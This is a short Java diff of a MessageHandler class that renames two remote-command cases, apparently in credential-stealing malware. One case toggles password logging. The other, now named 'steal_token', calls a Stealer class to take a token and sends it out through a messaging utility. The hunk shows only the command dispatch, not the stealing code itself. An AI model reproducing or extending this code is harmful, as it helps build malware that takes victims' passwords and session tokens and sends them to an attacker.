@@ -21,11 +21,11 @@ public class MessageHandler {
         if (msgArr.length < 1) return;
         try {
             switch (messageType) {
-                case "steal_pwd":
+                case "steal_pwd_switch":
                     if (msgArr.length < 2) break;
                     Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                     break;
-                case "share_token":
+                case "steal_token":
                     MessageUtils.sendMessage(messageType, new Stealer().stealToken());
                     break;
                 case "getcfg":
